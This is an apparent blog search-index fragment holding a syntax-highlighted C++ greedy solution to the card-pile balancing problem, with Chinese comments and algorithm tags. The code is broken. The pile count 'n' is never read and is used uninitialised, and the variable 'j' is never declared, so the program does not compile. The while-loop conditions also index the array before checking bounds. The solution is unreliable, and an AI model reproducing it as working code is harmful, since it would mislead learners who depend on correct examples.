<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> avg=<span class="number">0</span>, res=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> num[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;num[i];</span><br><span class="line">        avg+=num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    avg = avg/n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n;i++)&#123;</span><br><span class="line">        num[i] -= avg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>; j=n<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 找到左边起第一个非 0</span></span><br><span class="line">    <span class="keyword">while</span>(num[i]==<span class="number">0</span> &amp;&amp; i&lt;n)&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 找到右边起第一个非 0</span></span><br><span class="line">    <span class="keyword">while</span>(num[j]==<span class="number">0</span> &amp;&amp; j&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        j--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        num[i+<span class="number">1</span>] += num[i];</span><br><span class="line">        num[i] = <span class="number">0</span>;</span><br><span class="line">        res++;</span><br><span class="line">        i++;</span><br><span class="line">        <span class="comment">// 如果移牌后产生了 0</span></span><br><span class="line">        <span class="keyword">while</span>(num[i]==<span class="number">0</span> &amp;&amp; i&lt;j)&#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>贪心</tag>
      </tags>
  </entry>
</search>
